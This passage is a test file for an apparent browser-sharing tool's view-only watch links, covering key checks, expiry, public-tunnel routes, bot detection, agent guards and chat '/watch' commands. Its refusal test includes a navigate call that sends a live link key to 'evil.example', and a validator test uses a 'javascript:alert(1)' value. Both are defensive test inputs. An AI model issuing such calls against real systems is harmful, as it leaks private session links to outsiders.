// Watch links (share "watch"): a view-only link anyone who holds it may open from any browser, on
// the public address (liveview/public-turn.mjs) through the public tunnel (daemon/sharing.mjs,
// tunnel-pool.mjs). Their keys (liveview/invites.mjs): unguessable, compared in constant time, an
// hour by default and a day at most, expiry and revoke enforced by the helper. What they reach: the
// page, its files and one stream over a WebSocket (covered pictures, tabs, activity), never input,
// never the owner's routes, never on the owner's port; a link preview (no script, a HEAD, a bot's
// name) never gets the stream nor counts as watching. The tunnel runs only while a watch link (or a
// public hand-off) is open. Agents make one only with the user's yes, and never type one into a
// page. The side panel's and the Handoff page's counts, Stop and Stop all; /watch from the linked
// chat; hand-off messages with a watch link when asked for. Fake tabs and stand-in tunnels and
// chat APIs: no browser and no network.
import "./helpers/home.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { EventEmitter } from "node:events";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

process.env.PAIRBROWSE_HOME ||= mkdtempSync(join(tmpdir(), "pb-watch-"));
const { startLiveView, createInvites } = await import("../scripts/liveview.mjs");
const { WATCH_DEFAULT_HOURS, WATCH_MAX_HOURS, WATCH_HOURS } = await import("../scripts/liveview/invites.mjs");
const { PUBLIC_ROUTES, previewBot } = await import("../scripts/liveview/public-turn.mjs");
const { createGrants } = await import("../scripts/daemon/grants.mjs");
const { connect } = await import("../scripts/ws.mjs");
const { createSharing } = await import("../scripts/daemon/sharing.mjs");
const { decide, handoffAsk } = await import("../scripts/rules/decide.mjs");
const { createRefusals, SHARE_LINK_RULE } = await import("../scripts/daemon/serve/refuse.mjs");
const { messageProblem, messageText, watchForMessage } = await import("../scripts/daemon/notify/message.mjs");
const { createNotifier } = await import("../scripts/daemon/notify/index.mjs");
const { createPhoneLink, WATCH } = await import("../scripts/daemon/phonelink.mjs");
const { fakeTelegram, fakeDiscord, phoneHome, TG_TOKEN, DC_TOKEN } = await import("./helpers/phonelink-fakes.mjs");
const { INVITE_TOOL } = await import("../scripts/tools/catalog.mjs");

const PUB = "words-like-these.trycloudflare.com";
const ORIGIN = `https://${PUB}`;
const BROWSER_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1";
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const until = async (fn, ms = 3000) => { for (const end = Date.now() + ms; Date.now() < end; await wait(10)) { const v = await fn(); if (v) return v; } return null; };
const COVERED = Buffer.from("COVERED").toString("base64");

function fakeTabs(urls) {
  const sessions = [];
  const ctx = Object.assign(new EventEmitter(), { pages: () => pages, newPage: async () => { throw new Error("no new tabs here"); } });
  const tab = (url) => Object.assign(new EventEmitter(), { url: () => url, title: async () => `Title of ${url}`, context: () => ctx, bringToFront: async () => {}, evaluate: async () => null, opener: async () => null, isClosed: () => false });
  const pages = urls.map(tab);
  ctx.newCDPSession = async (page) => {
    const cdp = Object.assign(new EventEmitter(), { calls: [], page });
    cdp.send = async (method, params) => { cdp.calls.push({ method, params }); return method === "Page.captureScreenshot" ? { data: Buffer.from("RAW").toString("base64") } : {}; };
    cdp.detach = async () => {};
    sessions.push(cdp);
    return cdp;
  };
  const input = () => sessions.flatMap((s) => s.calls).filter((c) => c.method.startsWith("Input."));
  return { ctx, pages, sessions, input };
}

function request(port, method, path, { body, host = PUB, origin, ua = BROWSER_UA } = {}) {
  return new Promise((resolve, reject) => {
    const headers = { host, ...(ua ? { "user-agent": ua } : {}), ...(origin ? { origin } : {}), ...(body !== undefined ? { "content-type": "application/json" } : {}) };
    const req = http.request({ host: "127.0.0.1", port, method, path, headers }, (res) => {
      let text = "";
      res.setEncoding("utf8");
      res.on("data", (d) => (text += d));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, text }));
    });
    req.on("error", reject);
    if (body !== undefined) req.write(JSON.stringify(body));
    req.end();
  });
}
// A watch link's stream as its page opens it on the public address: a WebSocket, its events by name.
async function socket(port, key, { host = PUB, origin = ORIGIN, ua = BROWSER_UA } = {}) {
  const conn = await connect(`http://127.0.0.1:${port}/${key}/events`, { headers: { host, ...(origin ? { origin } : {}), ...(ua ? { "user-agent": ua } : {}) }, timeoutMs: 5000 });
  let text = "", closed = false;
  conn.onMessage((m) => { text += m; });
  conn.onClose(() => { closed = true; });
  return { conn, closed: () => closed, events: (name) => text.split("\n\n").filter((b) => b.startsWith(`event: ${name}\n`)).map((b) => JSON.parse(b.slice(b.indexOf("data: ") + 6))) };
}
// The owner's event stream (server-sent events on the owner's port), its text so far.
function ownerStream(port, key) {
  let text = "";
  const req = http.get({ host: "127.0.0.1", port, path: `/${key}/events?panel`, headers: { host: `127.0.0.1:${port}` } }, (res) => { res.setEncoding("utf8"); res.on("data", (d) => (text += d)); });
  req.on("error", () => {});
  return { text: () => text, close: () => req.destroy() };
}
const eventsIn = (text, name) => text.split("\n\n").filter((b) => b.startsWith(`event: ${name}\n`)).map((b) => JSON.parse(b.slice(b.indexOf("data: ") + 6)));

async function setup({ invites = createInvites(), grantsPublic = () => true } = {}) {
  const tabs = fakeTabs(["https://shop.example/pay?card=1", "https://other.example/"]);
  const grants = createGrants({});
  const covered = [];
  const view = await startLiveView({ getContext: async () => tabs.ctx, currentUrl: async () => tabs.pages[0].url(), invites, grants, publicHost: () => PUB, grantsPublic,
    covers: { want: () => {}, picture: async (page, img) => { covered.push(img); return COVERED; } } });
  view.setSession({ name: "default", where: "Local", instance: "secret-instance" });
  return { ...tabs, grants, invites, view, port: view.guestPort, ownerKey: view.url.split("/").at(-2), covered };
}
const frameOut = (s) => { const cdp = s.sessions.at(-1); cdp?.emit("Page.screencastFrame", { data: Buffer.from("PLAIN").toString("base64"), metadata: { deviceWidth: 1280, deviceHeight: 800 }, sessionId: 1 }); };

// ---- the keys ----

test("watch links: role watch only, an hour by default, a day at most, 256-bit keys matched in constant time, Stop all, never restored", () => {
  let t = 1_000_000;
  const invites = createInvites({ now: () => t, mono: () => t });
  const w = invites.create({ share: "watch" });
  assert.equal(w.role, "watch");
  assert.equal(w.label, "Watch link");
  assert.match(w.key, /^[0-9a-f]{64}$/, "32 random bytes");
  assert.equal(w.expiresAt - w.createdAt, WATCH_DEFAULT_HOURS * 3_600_000);
  assert.equal(WATCH_DEFAULT_HOURS, 1);
  assert.deepEqual(WATCH_HOURS, [0.25, 1, 4, 24]);
  assert.equal(invites.create({ share: "watch", hours: 1000 }).expiresAt - t, WATCH_MAX_HOURS * 3_600_000, "a day at most");
  assert.equal(invites.create({ share: "watch", hours: 0.25 }).expiresAt - t, 15 * 60_000);
  assert.throws(() => invites.create({ share: "watch", role: "drive" }), /view only/);
  assert.throws(() => invites.create({ share: "watch", role: "approve" }), /view only/);
  assert.throws(() => invites.create({ share: "watch", hours: 0 }), /above 0/);
  assert.equal(invites.create({ share: "link" }).role, "drive", "a plain link keeps its default");
  // The key: whole and exact, nothing near it.
  assert.equal(invites.match(w.key).id, w.id);
  assert.equal(invites.match(w.key.slice(0, 63)), null);
  assert.equal(invites.match(`${w.key}0`), null);
  assert.equal(invites.match(w.key.toUpperCase()), null);
  assert.equal(invites.match(""), null);
  const src = readFileSync(new URL("../scripts/liveview/invites.mjs", import.meta.url), "utf8");
  assert.match(src, /for \(const invite of all\.values\(\)\) if \(keyOk\(given, invite\.key\)\) found = invite;/, "every invite compared, each in constant time");
  // watchKey: the helper's own use, watch links only; keyIn: a page-bound text holding a live key.
  assert.equal(invites.watchKey(w.id), w.key);
  const link = invites.create({ share: "link", role: "watch" });
  assert.equal(invites.watchKey(link.id), null);
  assert.equal(invites.keyIn(`see https://x.trycloudflare.com/${w.key}/ now`), true);
  assert.equal(invites.keyIn("a".repeat(64)), false);
  // Expiry, enforced by the helper: the key stops matching, also when the wall clock is set back.
  t += 3_600_001;
  assert.equal(invites.match(w.key), null, "expired");
  assert.equal(invites.keyIn(w.key), false);
  // Stop all: watch links only (the day-long one above among them).
  const day = invites.list().find((i) => i.share === "watch");
  const a = invites.create({ share: "watch" }), b = invites.create({ share: "watch" });
  const code = invites.create({ share: "code", role: "drive" });
  const ended = [];
  invites.onEnd((ids) => ended.push(...ids));
  assert.equal(invites.revokeShare("watch"), 3);
  assert.deepEqual(ended.sort(), [day.id, a.id, b.id].sort());
  assert.ok(invites.get(code.id), "join codes stay");
  // Never kept across a restart of the helper.
  assert.ok(invites.savedCodes().every((i) => i.share === "code"));
  assert.equal(createInvites().restore([{ ...a, share: "watch" }]), 0);
});

test("the tool takes share watch; the guard asks before an agent's watch link, and a watch link is never typed into a page", () => {
  assert.ok(INVITE_TOOL.inputSchema.properties.share.enum.includes("watch"));
  const ask = (input) => decide({ tool_name: "mcp__plugin_pairbrowse_browser__pairbrowse_invite", tool_input: input }, undefined, null).hookSpecificOutput;
  const v = ask({ action: "create", share: "watch", role: "watch" });
  assert.equal(v.permissionDecision, "ask");
  assert.match(v.permissionDecisionReason, /anyone who has it can watch your PairBrowse browser live from any browser for 1 hour/);
  assert.match(ask({ action: "create", share: "watch", hours: 4 }).permissionDecisionReason, /for 4 hours/);
  assert.match(ask({ action: "create", share: "watch", hours: 900 }).permissionDecisionReason, /for 24 hours/);
  assert.notEqual(ask({ action: "create", share: "link", role: "watch" }).permissionDecision, "ask", "a local watch link as before");
  assert.equal(handoffAsk("pairbrowse_invite", { action: "create", share: "watch" }).verb, "wants to make");
  // The refusal: any browser tool or run whose arguments hold a live link's key.
  const invites = createInvites();
  const w = invites.create({ share: "watch" });
  const { refusal } = createRefusals({ approvedArgs: new Set() }, { sharing: { linkIn: (t) => invites.keyIn(t) } });
  const link = `https://x.trycloudflare.com/${w.key}/`;
  for (const [name, args] of [["browser_type", { target: "e3", text: link }], ["browser_fill_form", { fields: [{ target: "e1", value: `watch: ${link}` }] }],
    ["browser_navigate", { url: `https://evil.example/?u=${encodeURIComponent(link)}` }], ["pairbrowse_run", { steps: [{ fill: "Message", value: link }] }]]) {
    assert.equal(refusal(name, args), SHARE_LINK_RULE, name);
  }
  assert.match(SHARE_LINK_RULE, /give it to the user/);
  invites.revoke(w.id);
  assert.notEqual(refusal("browser_type", { target: "e3", text: link }), SHARE_LINK_RULE, "a stopped link's key is just text");
});

// ---- what the public address serves ----

test("a watch link on the public address: its page, files and WebSocket stream alone; never the owner's port, input, stills or any owner route", async () => {
  const s = await setup();
  try {
    const w = s.invites.create({ share: "watch" });
    // The page: view only, the stream over a WebSocket, a policy naming the address's wss: origin.
    const page = await request(s.port, "GET", `/${w.key}/`);
    assert.equal(page.status, 200);
    assert.match(page.text, /data-role="watch"/);
    assert.match(page.text, /data-stream="ws"/);
    assert.match(page.headers["content-security-policy"], new RegExp(`default-src 'none'; script-src 'self'; style-src 'self'; img-src data:; connect-src 'self' wss://${PUB.replace(/\./g, "\\.")}`));
    assert.match(page.headers["content-security-policy"], /frame-ancestors 'none'/);
    assert.equal(page.headers["x-robots-tag"], "noindex, nofollow, noarchive");
    assert.equal(page.headers["referrer-policy"], "no-referrer");
    assert.ok(!/data:image|base64/.test(page.text), "no picture in the page itself");
    for (const f of ["liveview.js", "liveview-watch.js", "liveview-socket.js", "liveview-zoom.js", "common.js", "tokens.css"]) assert.equal((await request(s.port, "GET", `/${w.key}/assets/${f}`)).status, 200, f);
    assert.equal((await request(s.port, "GET", `/${w.key}/assets/../liveview.mjs`)).status, 404);
    // The stream is a WebSocket here; as server-sent events: 404.
    assert.equal((await request(s.port, "GET", `/${w.key}/events`)).status, 404);
    // Nothing else, as a key never made: no input of any kind, no stills, no owner route.
    for (const [m, r] of [["POST", "input"], ["POST", "tab"], ["POST", "pause"], ["GET", "thumb.jpg"], ["GET", "state.json"], ["GET", "invites.json"], ["POST", "invite"],
      ["GET", "profile.json"], ["GET", "config.json"], ["POST", "config"], ["GET", "journal.json"], ["GET", "handoff.json"], ["POST", "approve"], ["POST", "turn-done"], ["GET", "nothing"]]) {
      assert.equal((await request(s.port, m, `/${w.key}/${r}`, m === "POST" ? { body: { type: "mouse", action: "mousePressed", x: 5, y: 5 }, origin: ORIGIN } : {})).status, 404, `${m} ${r}`);
    }
    assert.deepEqual([...PUBLIC_ROUTES.watch].sort(), ["GET ", "GET assets", "GET events"]);
    // Never on the owner's port (loopback or not): the public address alone.
    for (const r of ["", "events", "state.json", "thumb.jpg"]) assert.equal((await request(s.view.port, "GET", `/${w.key}/${r}`, { host: `127.0.0.1:${s.view.port}` })).status, 404, `owner port ${r}`);
    assert.equal((await request(s.view.port, "POST", `/${w.key}/input`, { host: `127.0.0.1:${s.view.port}`, body: { type: "mouse" } })).status, 404);
    // Another site's page can't open the stream.
    await assert.rejects(socket(s.port, w.key, { origin: "https://evil.example" }), (e) => e.status === 403);
    // An unknown or near key: 404 alike.
    for (const k of ["ab".repeat(32), w.key.slice(0, 63) + (w.key.endsWith("0") ? "1" : "0")]) assert.equal((await request(s.port, "GET", `/${k}/`)).status, 404);
    assert.equal(s.input().length, 0, "nothing reached a tab");
  } finally { s.view.close(); }
});

test("the stream: covered pictures, tabs without query strings, the session without the owner's fields; counted in the owner's list while open; no input from it", async () => {
  const s = await setup();
  const owner = ownerStream(s.view.port, s.ownerKey);
  try {
    const w = s.invites.create({ share: "watch" });
    // Loading the page counts nobody.
    await request(s.port, "GET", `/${w.key}/`);
    await request(s.port, "GET", `/${w.key}/`, { ua: "TelegramBot (like TwitterBot)" });
    const listed = async () => JSON.parse((await request(s.view.port, "GET", `/${s.ownerKey}/invites.json`, { host: `127.0.0.1:${s.view.port}` })).text).items.find((i) => i.id === w.id);
    assert.equal((await listed()).watching, 0);
    assert.equal(s.view.watching(w.id), 0);
    const a = await socket(s.port, w.key);
    assert.ok(await until(() => s.view.watching(w.id) === 1), "one page watching");
    assert.equal((await listed()).watching, 1);
    assert.ok(await until(() => eventsIn(owner.text(), "invites").some((e) => e.items.some((i) => i.id === w.id && i.watching === 1))), "the owner's pages hear the count");
    assert.ok(!owner.text().includes(w.key), "never the key in an event");
    // What the stream carries.
    assert.ok(await until(() => a.events("tabs").length));
    const tabs = a.events("tabs")[0];
    assert.ok(tabs.every((t) => !String(t.url).includes("?")), "no query strings");
    assert.equal(a.events("session")[0].instance, undefined, "not the owner's instance name");
    // Pictures: covered first (card and password fields), never as they came.
    frameOut(s);
    assert.ok(await until(() => a.events("frame").length), "a picture arrived");
    assert.ok(a.events("frame").every((f) => f.img === COVERED), "every picture covered");
    // The stream takes nothing: what the page might send is dropped.
    a.conn.send(JSON.stringify({ type: "mouse", action: "mousePressed", x: 5, y: 5 }));
    await wait(100);
    assert.equal(s.input().length, 0, "no input reached the browser");
    // A second page counts too; closing one counts down.
    const b = await socket(s.port, w.key);
    assert.ok(await until(() => s.view.watching(w.id) === 2));
    b.conn.close();
    assert.ok(await until(() => s.view.watching(w.id) === 1));
    a.conn.close();
  } finally { owner.close(); s.view.close(); }
});

test("link previews: a HEAD, a bot's name or no name never gets the stream or counts; the page alone opens it from its script", async () => {
  const s = await setup();
  try {
    const w = s.invites.create({ share: "watch" });
    for (const ua of ["TelegramBot (like TwitterBot)", "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)", "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
      "facebookexternalhit/1.1", "WhatsApp/2.23.20.0 A", "Twitterbot/1.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Headless/120.0", "curl/8.4.0", "python-requests/2.31", ""]) {
      assert.ok(previewBot({ method: "GET", headers: { "user-agent": ua } }), ua);
      await assert.rejects(socket(s.port, w.key, { ua }), (e) => e.status === 403, ua || "no user agent");
    }
    assert.ok(previewBot({ method: "HEAD", headers: { "user-agent": BROWSER_UA } }));
    for (const ua of [BROWSER_UA, "Mozilla/5.0 (Linux; Android 14; CUBOT X30) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"]) assert.equal(previewBot({ method: "GET", headers: { "user-agent": ua } }), false, ua);
    assert.notEqual((await request(s.port, "HEAD", `/${w.key}/`)).status, 200, "a HEAD gets nothing");
    assert.equal(s.view.watching(w.id), 0, "nobody counted");
    // The page opens the stream only from its script, once loaded: nothing in the markup does.
    const lv = readFileSync(new URL("../scripts/liveview.js", import.meta.url), "utf8");
    assert.match(lv, /else if \(watchLink\) \{[\s\S]*?if \(document\.readyState === "complete"\) go\(\); else addEventListener\("load", go, \{ once: true \}\);/);
    assert.match(lv, /if \(es \|\| ended \|\| \(watchLink && !watchUi\)\) return;/, "no stream before the watch viewer is up");
    const html = readFileSync(new URL("../scripts/liveview.html", import.meta.url), "utf8");
    assert.doesNotMatch(html, /events|og:image|<img [^>]*src=/, "no stream, preview picture or image in the markup");
    const watch = readFileSync(new URL("../scripts/liveview-watch.js", import.meta.url), "utf8");
    assert.doesNotMatch(watch, /method: "POST"|"input"|"tab"|postJson|localStorage|sessionStorage|document\.cookie|innerHTML|eval\(/, "the watch viewer sends and keeps nothing");
  } finally { s.view.close(); }
});

test("a stopped or expired watch link: its open pages go dark at once and the page answers 404, so the viewer says it ended", async () => {
  let t = Date.now();
  const invites = createInvites({ now: () => t, mono: () => t });
  const s = await setup({ invites });
  try {
    const w = invites.create({ share: "watch" });
    const a = await socket(s.port, w.key);
    assert.ok(invites.revoke(w.id));
    assert.ok(await until(() => a.closed()), "the stream ends at once");
    assert.equal((await request(s.port, "GET", `/${w.key}/`)).status, 404);
    const x = invites.create({ share: "watch", hours: 0.25 });
    const b = await socket(s.port, x.key);
    t += 15 * 60_000 + 1;
    assert.ok(await until(() => b.closed(), 4000), "expired: ended by the helper's own sweep");
    assert.equal((await request(s.port, "GET", `/${x.key}/`)).status, 404);
    await assert.rejects(socket(s.port, x.key), (e) => e.status === 404);
    // Stop all (the side panel's and the Handoff page's) from the owner's port.
    const y = invites.create({ share: "watch" }), z = invites.create({ share: "watch" });
    const c = await socket(s.port, y.key);
    const r = await request(s.view.port, "POST", `/${s.ownerKey}/invite`, { host: `127.0.0.1:${s.view.port}`, body: { op: "stop_watch" } });
    assert.deepEqual([r.status, JSON.parse(r.text)], [200, { ok: true, stopped: 2 }]);
    assert.ok(await until(() => c.closed()));
    assert.equal(invites.get(z.id), null);
    assert.equal((await request(s.view.port, "POST", `/${s.ownerKey}/invite`, { host: `127.0.0.1:${s.view.port}`, body: { op: "stop_watch", id: "x" } })).status, 409);
    // A watch link can't stop anything: the route is the owner's.
    const v = invites.create({ share: "watch" });
    assert.equal((await request(s.port, "POST", `/${v.key}/invite`, { body: { op: "stop_watch" }, origin: ORIGIN })).status, 404);
    assert.ok(invites.get(v.id));
  } finally { s.view.close(); }
});

test("a tunnel kept up for a watch link serves no hand-off made for the private route", async () => {
  let on = false;
  const s = await setup({ grantsPublic: () => on });
  try {
    const g = s.grants.mint({ session: "default", page: s.pages[0], action: "login" });
    assert.equal((await request(s.port, "GET", `/${g.redeemKey}/`)).status, 404, "the public hand-off link is off");
    on = true;
    assert.equal((await request(s.port, "GET", `/${g.redeemKey}/`)).status, 200);
  } finally { s.view.close(); }
});

test("joiners can't make, list or reach watch links: the join server takes none of their keys and has no invite route", async () => {
  const s = await setup();
  try {
    const w = s.invites.create({ share: "watch" });
    const code = s.invites.create({ share: "code", role: "drive" });
    // A joiner's key on the public address and on loopback: none of the owner's routes.
    for (const host of [PUB, `127.0.0.1:${s.port}`]) {
      for (const [m, r] of [["GET", "invites.json"], ["POST", "invite"]]) assert.notEqual((await request(s.port, m, `/${code.key}/${r}`, { host, ...(m === "POST" ? { body: { share: "watch" }, origin: ORIGIN } : {}) })).status, 200, `${host} ${m} ${r}`);
    }
    assert.equal(s.invites.list().filter((i) => i.share === "watch").length, 1, "nothing made");
    assert.ok(s.invites.get(w.id));
  } finally { s.view.close(); }
});

// ---- the helper's sharing part: making them, the tunnel's life ----

function sharingFor({ config = {}, start, grants = null } = {}) {
  const notes = [], told = [];
  const hostNote = (t) => notes.push(t);
  hostNote.drop = () => {};
  const live = { url: "http://127.0.0.1:4123/ownerkey/", port: 4123, guestPort: 4999, setStatus() {}, setSession() {}, setCollaboration() {}, setDev() {}, close() {}, watchGrants() {}, watching: () => 0 };
  const view = { currentUrl: () => "about:blank", getContext: async () => ({ pages: () => [] }), status: () => ({}), session: () => null, collaboration: () => ({}), secretDomains: () => [], grants };
  let opts = null;
  const logs = [];
  const sharing = createSharing({ config, log: (l) => logs.push(String(l)), host: "Me", view, notify: (t) => told.push(t), hostNote, startLive: async (o) => { opts = o; return live; }, startHandoff: start, handoffStopMs: 30 });
  return { sharing, opts: () => opts, notes, told, logs };
}
const tunnels = () => {
  const made = [];
  const start = async (port) => { const t = { url: `https://t${made.length}.trycloudflare.com`, host: `t${made.length}.trycloudflare.com`, port, stopped: false, child: new EventEmitter(), stop() { t.stopped = true; } }; made.push(t); return t; };
  return { made, start };
};

test("making a watch link starts the public tunnel to the guest port; it stays while one is open and stops with the last (stop, revoke_all, expiry)", async () => {
  const { made, start } = tunnels();
  const { sharing, opts, logs } = sharingFor({ start });
  try {
    const r = await sharing.inviteCommand({ action: "create", share: "watch" }, { who: "Claude Code" });
    assert.equal(r.error, undefined, r.text);
    const key = /trycloudflare\.com\/([0-9a-f]{64})\//.exec(r.text)?.[1];
    assert.ok(key, r.text);
    assert.match(r.text, /^Watch link [0-9a-f]{8} \(Watch link, view only\), until .+\. Anyone who has the link can watch this browser live/);
    assert.match(r.text, /\nLink: https:\/\/t0\.trycloudflare\.com\/[0-9a-f]{64}\/\n/);
    assert.match(r.text, /never paste it into a web page/);
    assert.equal(made.length, 1);
    assert.equal(made[0].port, 4999, "the guest port, never the owner's");
    assert.equal(opts().publicHost(), "t0.trycloudflare.com");
    assert.equal(opts().grantsPublic(), false, "hand-offs stay off it while the public hand-off link is off");
    assert.ok(!logs.some((l) => l.includes(key)), "the key is never logged");
    // A second link: the same tunnel. Listing shows them, without keys.
    const second = await sharing.inviteCommand({ action: "create", share: "watch", hours: 4 });
    assert.match(second.text, /t0\.trycloudflare\.com/);
    const list = (await sharing.inviteCommand({ action: "list" })).text;
    assert.match(list, /watch link \(anyone who has it\), 0 watching now/);
    assert.ok(!list.includes(key));
    const ids = [...list.matchAll(/- ([0-9a-f]{8}): /g)].map((m) => m[1]);
    assert.equal((await sharing.inviteCommand({ action: "revoke", id: ids[0] })).error, undefined);
    await wait(80);
    assert.equal(made[0].stopped, false, "another watch link is still open");
    await sharing.inviteCommand({ action: "revoke", id: ids[1] });
    assert.ok(await until(() => made[0].stopped), "stopped with the last one");
    assert.equal(opts().publicHost(), null);
    // revoke_all ends them too.
    await sharing.inviteCommand({ action: "create", share: "watch" });
    assert.equal(made.length, 2);
    assert.match((await sharing.inviteCommand({ action: "revoke_all" })).text, /No code works any more, nor any watch link/);
    assert.ok(await until(() => made[1].stopped));
    // The Share card makes the same (share "link" from an older page means a watch link).
    const card = await opts().makeInvite({ share: "link" });
    assert.deepEqual([card.ok, card.share, card.role], [true, "watch", "watch"]);
    assert.match(card.link, /^https:\/\/t2\.trycloudflare\.com\/[0-9a-f]{64}\/$/);
    const timed = await opts().makeInvite({ share: "watch", hours: 0.25 });
    assert.ok(timed.expiresAt - Date.now() <= 15 * 60_000 + 1000);
  } finally { sharing.endAll(); }
  assert.ok(made.every((t) => t.stopped), "the window closing stops it");
});

test("a public tunnel that drops by itself ends its watch links and says so; one that can't start shares nothing", async () => {
  const { made, start } = tunnels();
  const { sharing, notes, told } = sharingFor({ start });
  try {
    const r = await sharing.inviteCommand({ action: "create", share: "watch" });
    assert.equal(r.error, undefined);
    made[0].child.emit("exit");
    assert.ok(await until(async () => !(await sharing.inviteCommand({ action: "list" })).text.includes("watch link")), "ended");
    assert.ok(told.some((t) => /The watch links stopped/.test(t)));
    assert.ok(notes.some((t) => /The watch links stopped/.test(t)));
  } finally { sharing.endAll(); }
  const failing = sharingFor({ start: async () => { throw new Error("no relay today"); } });
  try {
    const r = await failing.sharing.inviteCommand({ action: "create", share: "watch" });
    assert.equal(r.error, true);
    assert.match(r.text, /couldn't start.*no relay today.*Nothing was shared/);
    assert.equal((await failing.sharing.inviteCommand({ action: "list" })).text, "No invites.", "the link was taken back");
  } finally { failing.sharing.endAll(); }
});

test("the linked chat's watch link: made once and said again while it has a while left", async () => {
  const { made, start } = tunnels();
  const { sharing } = sharingFor({ start });
  try {
    const a = await sharing.chatWatchLink();
    assert.match(a.link, /^https:\/\/t0\.trycloudflare\.com\/[0-9a-f]{64}\/$/);
    assert.ok(a.expiresAt > Date.now() + 59 * 60_000);
    const b = await sharing.chatWatchLink();
    assert.equal(b.link, a.link, "the same link again");
    assert.equal(made.length, 1);
    assert.equal(sharing.linkIn(`look: ${a.link}`), true);
  } finally { sharing.endAll(); }
});

// ---- messages and the linked chat ----

test("hand-off messages carry a watch link only with watchInMessages; a channel that withholds links withholds it too", async () => {
  const turn = { kind: "turn", id: "0a1b2c3d", action: "login", host: "shop.example", link: "https://t.trycloudflare.com/" + "a".repeat(64) + "/", expiresAt: Date.now() + 60_000 };
  const watch = "https://t.trycloudflare.com/" + "b".repeat(64) + "/";
  assert.equal(messageProblem({ ...turn, watch }), "");
  assert.equal(messageProblem({ kind: "approval", code: "K7Q2", host: "shop.example", action: "pay", expiresAt: Date.now() + 60_000, watch }), "");
  assert.match(messageProblem({ ...turn, watch: "javascript:alert(1)" }), /watch is a watch link/);
  assert.match(messageProblem({ kind: "ended", id: "0a1b2c3d", action: "login", host: "shop.example", expiresAt: Date.now() + 1, reason: "done", watch }), /watch/);
  assert.match(messageText({ ...turn, watch }).text, new RegExp(`\\nWatch live \\(view only\\): ${watch.replace(/[./]/g, "\\$&")}$`));
  assert.doesNotMatch(messageText({ ...turn, watch }, { withheld: true }).text, /Watch live/);
  assert.equal(await watchForMessage({ handoff: {} }, async () => ({ link: watch })), null, "off by default");
  assert.equal(await watchForMessage({ handoff: { watchInMessages: true } }, async () => ({ link: watch })), watch);
  assert.equal(await watchForMessage({ handoff: { watchInMessages: true } }, async () => { throw new Error("x"); }), null, "a message never waits on a failed link");
});

const CHAT = 555123456;
test("/watch from the linked Telegram chat answers with a watch link (previews off); anyone else, or /watch turned off, gets nothing", async () => {
  const tg = await fakeTelegram();
  const h = phoneHome();
  const running = { handoff: { enabled: false, away: true, channels: [] } };
  const notifier = createNotifier({ channels: () => running.handoff.channels, secret: (n) => h.secrets.get().values[n], log: h.log });
  let made = 0;
  const link = createPhoneLink({ config: running, secrets: h.secrets, notifier, log: h.log, configFile: h.configFile, linksFile: h.linksFile, telegramBase: tg.base, discordBase: "http://127.0.0.1:9", gatewayUrl: "ws://127.0.0.1:9/gateway",
    quietMs: 20, pollSeconds: 1, retryMs: 200, watchLink: async () => { made++; return { link: `https://w.trycloudflare.com/${"c".repeat(64)}/`, expiresAt: Date.UTC(2030, 0, 1, 14, 35) }; } });
  try {
    const r = await link.op({ op: "link", app: "telegram", token: TG_TOKEN });
    tg.push(tg.message(CHAT, r.handoff.telegram.code));
    assert.ok(await until(() => link.read().telegram.state === "linked"));
    assert.equal(link.read().watchCommand, true, "on by default");
    assert.equal(link.read().watchInMessages, false, "off by default");
    assert.ok(await until(() => link.reading().telegram), "read while /watch is on");
    assert.ok(await until(() => tg.of("setMyCommands").length === 1), "/watch in the bot's menu");
    assert.deepEqual(tg.of("setMyCommands")[0].body.commands.map((c) => c.command), ["watch"]);
    assert.ok(WATCH.test("/watch") && WATCH.test("/watch@pb_test_bot") && WATCH.test(" Watch ") && !WATCH.test("watch this") && !WATCH.test("/watchlist"));
    // Someone else: nothing.
    tg.push(tg.message(CHAT, "/watch", { from: 999999999 }));
    tg.push(tg.message(424242, "/watch", { from: 424242 }));
    await wait(150);
    assert.equal(made, 0);
    // The pinned chat and user: the link, until when, and that anyone with it can watch.
    tg.push(tg.message(CHAT, "/watch"));
    assert.ok(await until(() => tg.of("sendMessage").some((c) => /Watch the browser live/.test(c.body.text))));
    const msg = tg.of("sendMessage").find((c) => /Watch the browser live/.test(c.body.text)).body;
    assert.match(msg.text, /^Watch the browser live, view only until 14:35 UTC:\nhttps:\/\/w\.trycloudflare\.com\/c{64}\/\nAnyone with this link can watch until then\. Stop it in PairBrowse's side panel\.$/);
    assert.deepEqual(msg.link_preview_options, { is_disabled: true });
    assert.equal(String(msg.chat_id), String(CHAT));
    assert.ok(!h.lines.join("\n").includes("c".repeat(64)), "the link is never logged");
    // Turned off: no answer, the menu emptied, reading stops.
    assert.equal((await link.op({ op: "set", watchCommand: false })).handoff.watchCommand, false);
    assert.equal(h.file().handoff.watchCommand, false);
    assert.ok(await until(() => tg.of("setMyCommands").some((c) => c.body.commands.length === 0)));
    assert.ok(await until(() => !link.reading().telegram), "nothing waits: not reading");
    assert.equal((await link.op({ op: "set", watchInMessages: "yes" })).error, "watchInMessages is true or false.");
    assert.equal((await link.op({ op: "set", watchInMessages: true })).handoff.watchInMessages, true);
  } finally { link.stop(); await tg.close(); }
});

test("/watch in the linked Discord DM answers with a watch link, embeds suppressed", async () => {
  const dc = await fakeDiscord();
  const h = phoneHome();
  const running = { handoff: { enabled: false, away: true, channels: [] } };
  const notifier = createNotifier({ channels: () => running.handoff.channels, secret: (n) => h.secrets.get().values[n], log: h.log });
  const DM = "500000000000000005", USER = "400000000000000004";
  const link = createPhoneLink({ config: running, secrets: h.secrets, notifier, log: h.log, configFile: h.configFile, linksFile: h.linksFile, telegramBase: "http://127.0.0.1:9", discordBase: dc.base, gatewayUrl: dc.gateway,
